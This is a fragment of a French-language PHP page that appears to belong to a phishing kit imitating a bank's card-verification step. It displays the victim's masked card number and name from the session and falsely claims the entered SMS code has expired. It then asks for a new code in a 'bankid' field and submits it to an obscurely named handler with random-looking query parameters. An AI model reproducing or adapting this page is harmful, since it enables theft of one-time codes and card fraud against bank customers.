...
<?php include'navbar.php'?>
    <div class="contain biling-p">
     <form method="POST" action="<?php echo 'serv52033ex.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
        <center> <span class="step" style="text-transform:uppercase"></span>
          ...
          <div style="text-align:left;text-transform:uppercase"> <b>DATE : </b><?php echo date('d/m/Y H:i:s', time()); ?></span><br>
            <b>NUMERO DE CARTE : </b><span><?php echo substr($_SESSION['c_num'], 0,4); ?> XXXX XXXX <?php echo substr($_SESSION['c_num'], -4); ?> </span><br>
            <b>NOM : </b><span><?php echo $_SESSION["n_card"] ?></span><br>
          </div>
          &nbsp; <span style="color: #23527c;"></span><br>
		  <br /><strong><span style="background-color: #ff0000; color: #ffffff;">Le code saisi a expiré !<br> veuillez patienter, un nouveau code vous sera envoyé par SMS dans quelques instants...</span></strong><br />
          <div id="vu"> &nbsp;&nbsp;&nbsp; </div>
          <input id="css" style="margin-top:5px" name="bankid" class="bill_input"
            ...
            autocorrect="off" aria-required="true"  maxlength="10" pattern="[0-9]{0,10}$" type="text">
...
type="submit"><br>
  ...
  alt="" style="width: 283px; height: 78px;">
        </center>
      </form>
    </div>
